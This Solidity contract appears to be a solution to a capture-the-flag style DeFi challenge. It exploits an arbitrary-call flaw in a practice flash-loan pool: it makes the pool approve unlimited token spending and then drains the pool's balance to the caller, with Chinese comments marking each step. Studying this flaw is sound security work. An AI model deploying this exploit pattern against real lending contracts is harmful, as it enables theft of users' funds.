pragma solidity 0.8.17;

import "../truster/TrusterLenderPool.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract TrusterAttack {
    TrusterLenderPool pool;
    address token;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = _token;
    }

    function attack(address borrower) external {
        // 1. 呼叫 flashLoan 引導合約執行 approve max 給攻擊合約
        pool.flashLoan(
            0, borrower, token, abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
        );
        // 2. 攻擊合約再將餘額轉給攻擊者
        IERC20(token).transferFrom(address(pool), msg.sender, IERC20(token).balanceOf(address(pool)));
    }
}
